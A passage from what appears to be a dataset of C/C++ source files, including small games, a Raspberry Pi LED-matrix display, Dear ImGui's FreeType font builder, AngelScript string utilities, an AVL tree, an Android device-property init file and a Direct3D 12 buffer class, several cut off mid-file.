gradeFriend[0] = 0;\n    for(auto x:gradeFriend) cout << x << ' ';\n}\n",
    "// character.cpp\n\n#include \"character.h\"\n#include <cmath> // For trigonometric functions\n\nCharacter::Character(const std::string& name, float health, float shield, float strength)\n    : name(name), health(health), shield(shield), strength(strength) {}\n\nvoid Character::setName(const std::string& name) {\n    this->name = name;\n}\n\nstd::string Character::getName() const {\n    return name;\n}\n\nvoid Character::setHealth(float health) {\n    this->health = health;\n}\n\nfloat Character::getHealth() const {\n    return health;\n}\n\nvoid Character::setShield(float shield) {\n    this->shield = shield;\n}\n\nfloat Character::getShield() const {\n    return shield;\n}\n\nvoid Character::setStrength(float strength) {\n    this->strength = strength;\n}\n\nfloat Character::getStrength() const {\n    return strength;\n}\n\n//position functions\nfloat Character::getX() const {\n    return x;\n}\n\nfloat Character::getY() const {\n    return y;\n}\n\nfloat Character::getZ() const {\n    return z;\n}\n\n// Movement function implementation\nvoid Character::move(float dx, float dy, float dz) {\n    // Update character position accordingly\n}\n\nvoid Character::rotate(float angle) {\n    // Rotate the character\n    // For now, let's just rotate along the y-axis\n    // Update character rotation accordingly\n}\n",
    "#include \"../matrix/include/led-matrix.h\"\n\n#include <math.h>\n#include <signal.h>\n#include <stdio.h>\n#include <unistd.h>\n#include <chrono>\n#include <thread>\n#include <wiringPi.h>\n\n#include <exception>\n\n#define BORDER_LEFT 21\n#define BORDER_RIGHT 42\n#define BORDER_TOP 0\n#define BORDER_BOTTOM 42\n#define QUEUE_RIGHT 54\n#define QUEUE_TOP 1\n#define QUEUE_BOTTOM 30\n#define HOLD_LEFT 9\n#define HOLD_TOP 1\n#define HOLD_BOTTOM 8\n\nusing rgb_matrix::Canvas;\nusing rgb_matrix::RGBMatrix;\nusing rgb_matrix::FrameCanvas;\n\nusing namespace std;\n\nvolatile bool interrupt_received = false;\nstatic void InterruptHandler(int signo) {\n  interrupt_received = true;\n}\n\nvoid setupGPIO();\nvoid drawBorders(RGBMatrix *matrix);\n\nint main(int argc, char *argv[]) {\n\tRGBMatrix::Options matrix_options;\n\trgb_matrix::RuntimeOptions runtime_opt;\n\trgb_matrix::ParseOptionsFromFlags(&argc, &argv,\n                                         &matrix_options, &runtime_opt);\n\t\n\tsignal(SIGTERM, InterruptHandler);\n\tsignal(SIGINT, InterruptHandler);\n\t\n\tRGBMatrix *matrix = RGBMatrix::CreateFromOptions(matrix_options, runtime_opt);\n\tif (matrix == NULL)\n\treturn 1;\n\t\n\tdrawBorders(matrix);\n\tsetupGPIO();\n\t\n\tpullUpDnControl(16, PUD_UP);\n\t\n\twhile (1) {\n\t\tif (digitalRead(16) == 1) matrix->SetPixel(1, 1, 255, 0, 0);\n\t\telse matrix->SetPixel(1, 1, 0, 0, 0);\n\t\t//sleep(2);\n\t\tthis_thread::sleep_for(chrono::milliseconds(17));\n\t}\n\t\n\t//sleep(10000);\n\n\tmatrix->Clear();\n\tdelete matrix;\n\n\treturn 0;\n}\n\nvoid setupGPIO() {\n\t// setenv(\"WIRINGPI_GPIOMEM\", \"1\", 1);\n\twiringPiSetupGpio();\n\tpinMode(16, INPUT);\n}\n\nvoid drawBorders(RGBMatrix *matrix) {\n\tfor (int i = BORDER_TOP; i <= BORDER_BOTTOM; i++) {\n\t\tfor (int j = BORDER_LEFT - 1; j <= BORDER_LEFT; j++) {\n\t\t\tmatrix->SetPixel(j, i, 255, 255, 255);\n\t\t}\n\t\tfor (int j = BORDER_RIGHT; j <= BORDER_RIGHT + 1; j++) {\n\t\t\tmatrix->SetPixel(j, i, 255, 255, 255);\n\t\t}\n\t}\n\tfor (int i = BORDER_LEFT - 1; i <= BORDER_RIGHT + 1; i++) {\n\t\tmatrix->SetPixel(i, BORDER_BOTTOM, 255, 255, 255);\n\t\tmatrix->SetPixel(i, BORDER_BOTTOM + 1, 255, 255, 255);\n\t}\n\t\n\tfor (int i = QUEUE_TOP; i <= QUEUE_BOTTOM; i++) {\n\t\tfor (int j = QUEUE_RIGHT; j <= QUEUE_RIGHT + 1; j++) {\n\t\t\tmatrix->SetPixel(j, i, 255, 255, 255);\n\t\t}\n\t}\n\tfor (int i = BORDER_RIGHT + 1; i <= QUEUE_RIGHT + 1; i++) {\n\t\tmatrix->SetPixel(i, 0, 255, 255, 255);\n\t\tmatrix->SetPixel(i, 1, 255, 255, 255);\n\t\tmatrix->SetPixel(i, QUEUE_BOTTOM, 255, 255, 255);\n\t\tmatrix->SetPixel(i, QUEUE_BOTTOM + 1, 255, 255, 255);\n\t}\n\t\n\tfor (int i = HOLD_TOP; i <= HOLD_BOTTOM; i++) {\n\t\tfor (int j = HOLD_LEFT - 1; j <= HOLD_LEFT; j++) {\n\t\t\tmatrix->SetPixel(j, i, 255, 255, 255);\n\t\t}\n\t}\n\tfor (int i = HOLD_LEFT -1; i <= BORDER_LEFT; i++) {\n\t\tmatrix->SetPixel(i, 0, 255, 255, 255);\n\t\tmatrix->SetPixel(i, 1, 255, 255, 255);\n\t\tmatrix->SetPixel(i, HOLD_BOTTOM, 255, 255, 255);\n\t\tmatrix->SetPixel(i, HOLD_BOTTOM + 1, 255, 255, 255);\n\t}\n}\n",
    "// dear imgui: FreeType font builder (used as a replacement for the stb_truetype builder)\n// (code)\n\n// Get the latest version at https://github.com/ocornut/imgui/tree/master/misc/freetype\n// Original code by @vuhdo (Aleksei Skriabin). Improvements by @mikesart. Maintained since 2019 by @ocornut.\n\n// CHANGELOG\n// (minor and older changes stripped away, please see git history for details)\n//  2023/11/13: added support for ImFontConfig::RasterizationDensity field for scaling render density without scaling metrics.\n//  2023/08/01: added support for SVG fonts, enable by using '#define IMGUI_ENABLE_FREETYPE_LUNASVG' (#6591)\n//  2023/01/04: fixed a packing issue which in some occurrences would prevent large amount of glyphs from being packed correctly.\n//  2021/08/23: fixed crash when FT_Render_Glyph() fails to render a glyph and returns NULL.\n//  2021/03/05: added ImGuiFreeTypeBuilderFlags_Bitmap to load bitmap glyphs.\n//  2021/03/02: set 'atlas->TexPixelsUseColors = true' to help some backends with deciding of a preferred texture format.\n//  2021/01/28: added support for color-layered glyphs via ImGuiFreeTypeBuilderFlags_LoadColor (require Freetype 2.10+).\n//  2021/01/26: simplified integration by using '#define IMGUI_ENABLE_FREETYPE'. renamed ImGuiFreeType::XXX flags to ImGuiFreeTypeBuilderFlags_XXX for consistency with other API. removed ImGuiFreeType::BuildFontAtlas().\n//  2020/06/04: fix for rare case where FT_Get_Char_Index() succeed but FT_Load_Glyph() fails.\n//  2019/02/09: added RasterizerFlags::Monochrome flag to disable font anti-aliasing (combine with ::MonoHinting for best results!)\n//  2019/01/15: added support for imgui allocators + added FreeType only override function SetAllocatorFunctions().\n//  2019/01/10: re-factored to match big update in STB builder. fixed texture height waste. fixed redundant glyphs when merging. support for glyph padding.\n//  2018/06/08: added support for ImFontConfig::GlyphMinAdvanceX, GlyphMaxAdvanceX.\n//  2018/02/04: moved to main imgui repository (away from http://www.github.com/ocornut/imgui_club)\n//  2018/01/22: fix for addition of ImFontAtlas::TexUvscale member.\n//  2017/10/22: minor inconsequential change to match change in master (removed an unnecessary statement).\n//  2017/09/26: fixes for imgui internal changes.\n//  2017/08/26: cleanup, optimizations, support for ImFontConfig::RasterizerFlags, ImFontConfig::RasterizerMultiply.\n//  2017/08/16: imported from https://github.com/Vuhdo/imgui_freetype into http://www.github.com/ocornut/imgui_club, updated for latest changes in ImFontAtlas, minor tweaks.\n\n// About Gamma Correct Blending:\n// - FreeType assumes blending in linear space rather than gamma space.\n// - See https://www.freetype.org/freetype2/docs/reference/ft2-base_interface.html#FT_Render_Glyph\n// - For correct results you need to be using sRGB and convert to linear space in the pixel shader output.\n// - The default dear imgui styles will be impacted by this change (alpha values will need tweaking).\n\n// FIXME: cfg.OversampleH, OversampleV are not supported (but perhaps not so necessary with this rasterizer).\n\n#include \"imgui.h\"\n#ifndef IMGUI_DISABLE\n#include \"imgui_freetype.h\"\n#include \"imgui_internal.h\"     // ImMin,ImMax,ImFontAtlasBuild*,\n#include <stdint.h>\n#include <ft2build.h>\n#include FT_FREETYPE_H          // <freetype/freetype.h>\n#include FT_MODULE_H            // <freetype/ftmodapi.h>\n#include FT_GLYPH_H             // <freetype/ftglyph.h>\n#include FT_SYNTHESIS_H         // <freetype/ftsynth.h>\n\n#ifdef IMGUI_ENABLE_FREETYPE_LUNASVG\n#include FT_OTSVG_H             // <freetype/otsvg.h>\n#include FT_BBOX_H              // <freetype/ftbbox.h>\n#include <lunasvg.h>\n#if !((FREETYPE_MAJOR >= 2) && (FREETYPE_MINOR >= 12))\n#error IMGUI_ENABLE_FREETYPE_LUNASVG requires FreeType version >= 2.12\n#endif\n#endif\n\n#ifdef _MSC_VER\n#pragma warning (push)\n#pragma warning (disable: 4505)     // unreferenced local function has been removed (stb stuff)\n#pragma warning (disable: 26812)    // [Static Analyzer] The enum type 'xxx' is unscoped. Prefer 'enum class' over 'enum' (Enum.3).\n#endif\n\n#ifdef __GNUC__\n#pragma GCC diagnostic push\n#pragma GCC diagnostic ignored \"-Wpragmas\"                  // warning: unknown option after '#pragma GCC diagnostic' kind\n#pragma GCC diagnostic ignored \"-Wunused-function\"          // warning: 'xxxx' defined but not used\n#ifndef __clang__\n#pragma GCC diagnostic ignored \"-Wsubobject-linkage\"        // warning: 'xxxx' has a field 'xxxx' whose type uses the anonymous namespace\n#endif\n#endif\n\n//-------------------------------------------------------------------------\n// Data\n//-------------------------------------------------------------------------\n\n// Default memory allocators\nstatic void* ImGuiFreeTypeDefaultAllocFunc(size_t size, void* user_data) { IM_UNUSED(user_data); return IM_ALLOC(size); }\nstatic void  ImGuiFreeTypeDefaultFreeFunc(void* ptr, void* user_data) { IM_UNUSED(user_data); IM_FREE(ptr); }\n\n// Current memory allocators\nstatic ",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"exam1\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"game.h\"\n#include \"ui_widget.h\"\n#include \"field.h\"\n#include \"ships.h\"\n#include \"tools.h\"\n#include \"bot.h\"\n\nGame::Game(QWidget *parent) noexcept\n    : QWidget(parent)\n    , ui(new Ui::Game)\n{\n    ui->setupUi(this);\n\n    if(rand() % 2) whoMove = Gamer::player;\n    else whoMove = Gamer::bot;\n\n    infoBar = new InfoBar(this);\n\n    fieldPlayer = new PlayerField(this);\n    fieldPlayer->spawnShips();\n\n    fieldBot = new BotField(this);\n    fieldBot->spawnShips();\n\n    bot = new Bot(this, fieldPlayer);\n\n    toolsBar = new ToolsBar(this, bot);\n\n    mainMenu = new MainMenu(this);\n    winMenu = new WinMenu(this);\n}\n\nGame::~Game()\n{\n    delete ui;\n}\n\nvoid Game::randomMovePlayerShips()\n{\n    if(gameStatus == finished) fieldPlayer->randomMoveAllShips();\n}\n\nvoid Game::updateWidgetsSize()\n{\n\n    infoBar->resize(width() , height() * 0.15);\n\n    const int fieldSize = std::min(width() / 2, (height() - infoBar->height()) / 2);\n\n    fieldBot->reSize();\n    fieldPlayer->reSize();\n    infoBar->move(0, fieldSize);\n    fieldPlayer->move(0, infoBar->y() + infoBar->height());\n    toolsBar->setGeometry(fieldBot->width(), 0, width() - fieldBot->width(), height());\n    infoBar->resize(width() - toolsBar->width(), height() * 0.15);\n\n    mainMenu->resize();\n    winMenu->resize();\n}\n\nvoid Game::showMainMenu()\n{\n    mainMenu->show();\n}\n\nvoid Game::changeWhoMove()\n{\n    if(whoMove == Gamer::bot) whoMove = Gamer::player;\n    else whoMove = Gamer::bot;\n    infoBar->hint->updateWhoMove();\n}\n\nvoid Game::resetGame()\n{\n    gameStatus = finished;\n    bot->reset();\n    toolsBar->reset();\n    fieldPlayer->reset();\n    fieldBot->reset();\n    infoBar->reset();\n    if(rand() % 2) whoMove = Gamer::player;\n    else whoMove = Gamer::bot;\n}\n\nbool Game::startGame()\n{\n    if(gameStatus == finished) {\n        for(auto const &targetShip : fieldPlayer->getAllShips()) {\n            for(auto const &ship : fieldPlayer->getAllShips()) {\n                if(targetShip != ship){\n                    if(targetShip->checkCollision(targetShip->pos(), ship)) {\n                        infoBar->hint->gameStartFault();\n                        return false;\n                    }\n                }\n            }\n        }\n        fieldBot->randomMoveAllShips();\n        gameStatus = started;\n        bot->activate();\n        infoBar->hint->gameStarted();\n        return true;\n    }\n    infoBar->hint->gameStartFault();\n    return false;\n}\n\nvoid Game::finishGame(Gamer winner)\n{\n    winMenu->show(winner);\n    bot->reset();\n    gameStatus = over;\n    infoBar->hint->gameOver(winner);\n}\n\nvoid Game::activateBot()\n{\n    bot->activate();\n}\n\nvoid Game::changeDifficult(Difficult diff)\n{\n    bot->changeDifficult(diff);\n}\n\nvoid Game::resizeEvent(QResizeEvent *e)\n{\n    Q_UNUSED(e)\n    updateWidgetsSize();\n}\n\nvoid Game::mousePressEvent(QMouseEvent *e)\n{\n    Q_UNUSED(e)\n}\n\nvoid Game::mouseMoveEvent(QMouseEvent *e)\n{\n    Q_UNUSED(e)\n}\n\n",
    "#include <assert.h>\n#include \"scriptstdstring.h\"\n#include \"../scriptarray/scriptarray.h\"\n#include <stdio.h>\n#include <string.h>\n\nusing namespace std;\n\nBEGIN_AS_NAMESPACE\n\n// This function takes an input string and splits it into parts by looking\n// for a specified delimiter. Example:\n//\n// string str = \"A|B||D\";\n// array<string>@ array = str.split(\"|\");\n//\n// The resulting array has the following elements:\n//\n// {\"A\", \"B\", \"\", \"D\"}\n//\n// AngelScript signature:\n// array<string>@ string::split(const string &in delim) const\nstatic CScriptArray *StringSplit(const string &delim, const string &str)\n{\n\t// Obtain a pointer to the engine\n\tasIScriptContext *ctx = asGetActiveContext();\n\tasIScriptEngine *engine = ctx->GetEngine();\n\n\t// TODO: This should only be done once\n\t// TODO: This assumes that CScriptArray was already registered\n\tasITypeInfo *arrayType = engine->GetTypeInfoByDecl(\"array<string>\");\n\n\t// Create the array object\n\tCScriptArray *array = CScriptArray::Create(arrayType);\n\n\t// Find the existence of the delimiter in the input string\n\tsize_t pos = 0, prev = 0;\n\tasUINT count = 0;\n\twhile( (pos = str.find(delim, prev)) != string::npos )\n\t{\n\t\t// Add the part to the array\n\t\tarray->Resize(array->GetSize()+1);\n\t\t((string*)array->At(count))->assign(&str[prev], pos-prev);\n\n\t\t// Find the next part\n\t\tcount++;\n\t\tprev = pos + delim.length();\n\t}\n\n\t// Add the remaining part\n\tarray->Resize(array->GetSize()+1);\n\t((string*)array->At(count))->assign(&str[prev]);\n\n\treturn array;\n}\n\nstatic void StringSplit_Generic(asIScriptGeneric *gen)\n{\n\t// Get the arguments\n\tstring *str   = (string*)gen->GetObject();\n\tstring *delim = *(string**)gen->GetAddressOfArg(0);\n\n\t// Return the array by handle\n\t*(CScriptArray**)gen->GetAddressOfReturnLocation() = StringSplit(*delim, *str);\n}\n\n\n\n// This function takes as input an array of string handles as well as a\n// delimiter and concatenates the array elements into one delimited string.\n// Example:\n//\n// array<string> array = {\"A\", \"B\", \"\", \"D\"};\n// string str = join(array, \"|\");\n//\n// The resulting string is:\n//\n// \"A|B||D\"\n//\n// AngelScript signature:\n// string join(const array<string> &in array, const string &in delim)\nstatic string StringJoin(const CScriptArray &array, const string &delim)\n{\n\t// Create the new string\n\tstring str = \"\";\n\tif( array.GetSize() )\n\t{\n\t\tint n;\n\t\tfor( n = 0; n < (int)array.GetSize() - 1; n++ )\n\t\t{\n\t\t\tstr += *(const string*)array.At(n);\n\t\t\tstr += delim;\n\t\t}\n\n\t\t// Add the last part\n\t\tstr += *(const string*)array.At(n);\n\t}\n\n\treturn str;\n}\n\nstatic void StringJoin_Generic(asIScriptGeneric *gen)\n{\n\t// Get the arguments\n\tCScriptArray  *array = *(CScriptArray**)gen->GetAddressOfArg(0);\n\tstring *delim = *(string**)gen->GetAddressOfArg(1);\n\n\t// Return the string\n\tnew(gen->GetAddressOfReturnLocation()) string(StringJoin(*array, *delim));\n}\n\n// This is where the utility functions are registered.\n// The string type must have been registered first.\nvoid RegisterStdStringUtils(asIScriptEngine *engine)\n{\n\tint r;\n\n\tif( strstr(asGetLibraryOptions(), \"AS_MAX_PORTABILITY\") )\n\t{\n\t\tr = engine->RegisterObjectMethod(\"string\", \"array<string>@ split(const string &in) const\", asFUNCTION(StringSplit_Generic), asCALL_GENERIC); assert(r >= 0);\n\t\tr = engine->RegisterGlobalFunction(\"string join(const array<string> &in, const string &in)\", asFUNCTION(StringJoin_Generic), asCALL_GENERIC); assert(r >= 0);\n\t}\n\telse\n\t{\n\t\tr = engine->RegisterObjectMethod(\"string\", \"array<string>@ split(const string &in) const\", asFUNCTION(StringSplit), asCALL_CDECL_OBJLAST); assert(r >= 0);\n\t\tr = engine->RegisterGlobalFunction(\"string join(const array<string> &in, const string &in)\", asFUNCTION(StringJoin), asCALL_CDECL); assert(r >= 0);\n\t}\n}\n\nEND_AS_NAMESPACE\n",
    "#include \"AssetStore.h\"\n\nAssetStore::AssetStore()\n{\n\tLOG_INFO(\"AssetStore created!\");\n}\n\nAssetStore::~AssetStore()\n{\n\tLOG_INFO(\"AssetStore removed!\");\n}\n\nvoid AssetStore::Clear()\n{\n\tfor (auto texture : mTexture) {\n\t\tSDL_DestroyTexture(texture.second);\n\t}\n\n\tfor (auto font : mFonts) {\n\t\tTTF_CloseFont(font.second);\n\t}\n\n\tmTexture.clear();\n\tmFonts.clear();\n}\n\nvoid AssetStore::AddFont(const std::string& pKeyAccess, const std::string& pFilePath, int pFontSize)\n{\n\tmFonts.emplace(pKeyAccess, TTF_OpenFont(pFilePath.c_str(), pFontSize));\n}\n\nTTF_Font* AssetStore::GetFont(const std::string& pKeyAccess)\n{\n\treturn mFonts[pKeyAccess];\n}\n\nvoid AssetStore::AddTexture(SDL_Renderer* pRenderer, const std::string& pKeyAccess, const std::string& pFilePath)\n{\n\tSDL_Surface* surface = IMG_Load(pFilePath.c_str());\n\tSDL_Texture* texture = SDL_CreateTextureFromSurface(pRenderer, surface);\n\tSDL_FreeSurface(surface);\n\n\tmTexture.emplace(pKeyAccess, texture);\n}\n\nSDL_Texture* AssetStore::GetTexture(const std::string& pKeyAccess) \n{\n\treturn mTexture[pKeyAccess];\n}\n",
    "#include <iostream>\n#include <cstdlib>\n#include <ctime>\n\nusing namespace std;\n\nint main() {\n    // Generate a random secret number between 1 and 100\n    srand(time(0));\n    int secretNumber = rand() % 100 + 1;\n\n    int guess;\n    int attempts;\n\n    cout << \"***Welcome to the Number Guessing Game!***\" << endl;\n    cout << \"I have selected a secret number between 1 and 100.\" << endl;\n    cout << \"Try to guess it!\" << endl;\n\n    // Ask the user to select the level of difficulty\n    cout << \"Choose the level of difficulty:\" << endl;\n    cout << \"1. Easy (10 chances)\" << endl;\n    cout << \"2. Medium (7 chances)\" << endl;\n    cout << \"3. Hard (5 chances)\" << endl;\n    int level;\n    cin >> level;\n\n    switch (level) {\n        case 1:\n            attempts = 10;\n            break;\n        case 2:\n            attempts = 7;\n            break;\n        case 3:\n            attempts = 5;\n            break;\n        default:\n            cout << \"Invalid choice. Exiting the game.\" << endl;\n            return 0;\n    }\n\n    // Main game loop\n    while (attempts > 0) {\n        cout << \"Enter your guess: \";\n        cin >> guess;\n\n        if (guess == secretNumber) {\n            cout << \"Congratulations! You guessed the correct number: \" << secretNumber << endl;\n            break;\n        } else if (guess < secretNumber) {\n            cout << \"Too low! Try again.\" << endl;\n        } else {\n            cout << \"Too high! Try again.\" << endl;\n        }\n\n        attempts--;\n    }\n\n    if (attempts == 0) {\n        cout << \"Out of chances! The secret number was: \" << secretNumber << endl;\n    }\n\n    return 0;\n}",
    "#include<iostream>\n#include <queue>\nusing namespace std;\ntemplate<class t>\nclass Node {\npublic:\n    t data;\n    Node *left;\n    Node *right;\n    int height;\n    Node(){\n        right=left= nullptr;\n        height=1;\n    }\n\n};\ntemplate<class t>\nclass AVL{\n    Node<t> *root;\n\n    int height(Node<t>* n){\n        if(n == nullptr)\n            return 0;\n        return  n->height;\n    }\n    int getBalance(Node<t>*n)\n    {\n        if(n==nullptr)\n            return 0;\n        return height(n->left)- height(n->right);\n    }\n    Node<t>* rightRotate(Node<t>* y)\n    {\n        Node<t> *x=y->left;\n        Node<t> *temp=x->right;\n\n        x->right=y;\n        y->left=temp;\n\n        y->height= 1+max(height(y->left), height(y->right));\n        x->height= 1+max(height(x->left), height(x->right));\n\n        return x;\n    }\n\n    Node<t>* leftRotate(Node<t>* y){\n\n\n        Node<t> *x=y->right;\n        Node<t> *temp=x->left;\n\n        x->left=y;\n        y->right=temp;\n\n        y->height= 1+max(height(y->left), height(y->right));\n        x->height= 1+max(height(x->left), height(x->right));\n\n        return x;\n\n    }\n\n    Node<t>* insertHelper(Node<t>* node,t key) {\n\n        if (node == nullptr) {\n            auto newNode = new Node<t>;\n            newNode->data = key;\n            return newNode;\n        }\n        if (!(key > node->data))\n        {\n            node->left= insertHelper(node->left,key);\n        }\n        else if(key>node->data)\n        {\n            node->right = insertHelper(node->right,key);\n        }\n        else\n            return node;//to prevent multiplication in AVL\n\n        node->height=1+max(height(node->right), height(node->left));\n\n        int balance= getBalance(node);\n//rotations\n        if(balance>1 && !(key > node->left->data))\n            return rightRotate(node);\n\n        if(balance<-1 && key > node->right->data)\n            return leftRotate(node);\n\n        if (balance>1 && key > node->left->data)\n        {\n            node->left = leftRotate(node->left);\n            return rightRotate(node);\n        }\n        if (balance < -1 && !(key > node->right->data))\n        {\n            node->right = rightRotate(node->right);\n            return leftRotate(node);\n        }\n\n        return node;\n    }\n    Node<t>* deleteHelper(Node<t>* root,t data){\n        if(root==nullptr)\n            return root;\n        if(data < root->data)\n            root->left = deleteHelper(root->left,data);\n        else if(!(data <= root->data))\n            root->right =deleteHelper(root->right,data)  ;\n        else{\n            if((root->left == nullptr)||(root->right == nullptr)){\n                Node<t> *temp=root->left? root->left : root->right;\n                if (temp==nullptr)\n                {\n                    temp=root;\n                    root=nullptr;\n                }\n                else\n                    *root = *temp;\n                free(temp);\n            }\n            else{\n                Node<t> *temp = minValueNode(root->right);\n                root->data = temp->data;\n                root->right = deleteHelper(root->right,temp->data);\n            }\n        }\n        if(root==nullptr)\n            return root;\n        root->height =1 + max(height(root->left),height(root->right));\n        int balance = getBalance(root);\n        if(balance>1 && getBalance(root->left)>=0)\n            return rightRotate(root);\n        if(balance>1 && getBalance(root->left)<0)\n        {\n            root->left = leftRotate(root->left);\n            return rightRotate(root);\n        }\n        if(balance<-1 && getBalance(root->right)<=0)\n            return leftRotate(root);\n        if(balance<-1 && getBalance(root->left)>0)\n        {\n            root->right = rightRotate(root->right);\n            return leftRotate(root);\n        }\n        return root;\n    }\n\n    void inorder(Node<t>* n)\n    {\n        if(n != nullptr) {\n\n            inorder(n->left);\n            cout<<n->data<<\" \";\n            inorder(n->right);\n        }\n    }\n    void des(Node<t>* n)\n    {\n        if(n != nullptr) {\n\n            des(n->right);\n            cout<<n->data<<\" \";\n            des(n->left);\n        }\n    }\n    void printH(Node<t>* n)\n    {\n        if(n != nullptr) {\n\n            cout<<n->data<<\" \";;\n            printH(n->left);\n            printH(n->right);\n\n        }\n    }\n    Node<t>* minValueNode(Node<t>*node)\n    {\n        Node<t>* current = node;\n        while (current->left != nullptr)\n            current = current->left;\n        return current;\n\n    }\npublic:\n    AVL(){\n        root= nullptr;\n    }\n    void insert(t val)\n    {\n        root = insertHelper(root,val);\n    }\n    void insertn(t val)\n    {\n        root = insertHelpername(root,val);\n    }\n    void printAsc()\n    {\n        inorder(root);\n        cout<<endl;\n    }\n    void printDes()\n    {\n        des(root);\n        cout<<endl;\n    }\n    void printNormally()\n    {\n        printH(root);\n        cout<<endl;\n    }\n    void BF()\n    {\n        if(root==NULL)\n            return;\n        queue<Node<t>",
    "#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <android-base/properties.h>\n\n#define _REALLY_INCLUDE_SYS__SYSTEM_PROPERTIES_H_\n#include <sys/_system_properties.h>\n\nusing android::base::GetProperty;\nusing std::string;\n\nvoid property_override(string prop, string value)\n{\n    auto pi = (prop_info *)__system_property_find(prop.c_str());\n\n    if (pi != nullptr)\n        __system_property_update(pi, value.c_str(), value.size());\n    else\n        __system_property_add(prop.c_str(), prop.size(), value.c_str(), value.size());\n}\n\nvoid vendor_load_properties()\n{\n    string prop_partitions[] = {\"\", \"vendor.\", \"odm.\"};\n    for (const string &prop : prop_partitions)\n    {\n        property_override(string(\"ro.product.\") + prop + string(\"brand\"), \"Redmi\");\n        property_override(string(\"ro.product.\") + prop + string(\"name\"), \"zircon\");\n        property_override(string(\"ro.product.\") + prop + string(\"device\"), \"zircon\");\n        property_override(string(\"ro.product.\") + prop + string(\"model\"), \"23090RA98G\");\n        property_override(string(\"ro.product.\") + prop + string(\"marketname\"), \"Redmi Note 13 Pro+ 5G\");\n    }\n    property_override(\"ro.bootimage.build.date.utc\", \"1609430400\");\n    property_override(\"ro.build.date.utc\", \"1609430400\");\n}\n",
    "#include \"GpuBuffer.hpp\"\n\n#include <winrt/base.h>\n\n#include \"ErrorHandling.hpp\"\n#include \"GpuCommandList.hpp\"\n#include \"GpuSystem.hpp\"\n\nnamespace MotionToGo\n{\n    GpuBuffer::GpuBuffer() noexcept = default;\n\n    GpuBuffer::GpuBuffer(GpuSystem& gpu_system, uint32_t size, D3D12_HEAP_TYPE heap_type, D3D12_RESOURCE_FLAGS flags,\n        D3D12_RESOURCE_STATES init_state, std::wstring_view name)\n        : heap_type_(heap_type), curr_state_(init_state)\n    {\n        const D3D12_HEAP_PROPERTIES heap_prop = {heap_type, D3D12_CPU_PAGE_PROPERTY_UNKNOWN, D3D12_MEMORY_POOL_UNKNOWN, 1, 1};\n\n        desc_ = {D3D12_RESOURCE_DIMENSION_BUFFER, 0, static_cast<uint64_t>(size), 1, 1, 1, DXGI_FORMAT_UNKNOWN, {1, 0},\n            D3D12_TEXTURE_LAYOUT_ROW_MAJOR, flags};\n        TIFHR(gpu_system.NativeDevice()->CreateCommittedResource(\n            &heap_prop, D3D12_HEAP_FLAG_NONE, &desc_, init_state, nullptr, winrt::guid_of<ID3D12Resource>(), resource_.put_void()));\n        if (!name.empty())\n        {\n            resource_->SetName(std::wstring(std::move(name)).c_str());\n        }\n    }\n\n    GpuBuffer::GpuBuffer(ID3D12Resource* native_resource, D3D12_RESOURCE_STATES curr_state, std::wstring_view name)\n        : resource_(native_resource, winrt::take_ownership_from_abi), curr_state_(curr_state)\n    {\n        if (resource_)\n        {\n            D3D12_HEAP_PROPERTIES heap_prop;\n            resource_->GetHeapProperties(&heap_prop, nullptr);\n            heap_type_ = heap_prop.Type;\n\n            desc_ = resource_->GetDesc();\n            if (!name.empty())\n            {\n                resource_->SetName(std::wstring(std::move(name)).c_str());\n            }\n        }\n    }\n\n    GpuBuffer::~GpuBuffer() noexcept = default;\n\n    GpuBuffer::GpuBuffer(GpuBuffer&& other) noexcept = default;\n    GpuBuffer& GpuBuffer::operator=(GpuBuffer&& other) noexcept = default;\n\n    GpuBuffer GpuBuffer::Share() const\n    {\n        GpuBuffer buffer;\n        buffer.resource_ = resource_;\n        buffer.desc_ = desc_;\n        buffer.heap_type_ = heap_type_;\n        buffer.curr_state_ = curr_state_;\n        return buffer;\n    }\n\n    GpuBuffer::operator bool() const noexcept\n    {\n        return resource_ ? true : false;\n    }\n\n    ID3D12Resource* GpuBuffer::NativeBuffer() const noexcept\n    {\n        return resource_.get();\n    }\n\n    D3D12_GPU_VIRTUAL_ADDRESS GpuBuffer::GpuVirtualAddress() const noexcept\n    {\n        return resource_->GetGPUVirtualAddress();\n    }\n\n    uint32_t GpuBuffer::Size() const noexcept\n    {\n        return static_cast<uint32_t>(desc_.Width);\n    }\n\n    void* GpuBuffer::Map(const D3D12_RANGE& read_range)\n    {\n        void* addr;\n        TIFHR(resource_->Map(0, &read_range, &addr));\n        return addr;\n    }\n\n    void* GpuBuffer::Map()\n    {\n        void* addr;\n        const D3D12_RANGE read_range{0, 0};\n        TIFHR(resource_->Map(0, (heap_type_ == D3D12_HEAP_TYPE_READBACK) ? nullptr : &read_range, &addr));\n        return addr;\n    }\n\n    void GpuBuffer::Unmap(const D3D12_RANGE& write_range)\n    {\n        resource_->Unmap(0, (heap_type_ == D3D12_HEAP_TYPE_UPLOAD) ? nullptr : &write_range);\n    }\n\n    void GpuBuffer::Unmap()\n    {\n        this->Unmap(D3D12_RANGE{0, 0});\n    }\n\n    void GpuBuffer::Reset() noexcept\n    {\n        resource_ = nullptr;\n        desc_ = {};\n        heap_type_ = {};\n        curr_state_ = {};\n    }\n\n    D3D12_RESOURCE_STATES GpuBuffer::State() const noexcept\n    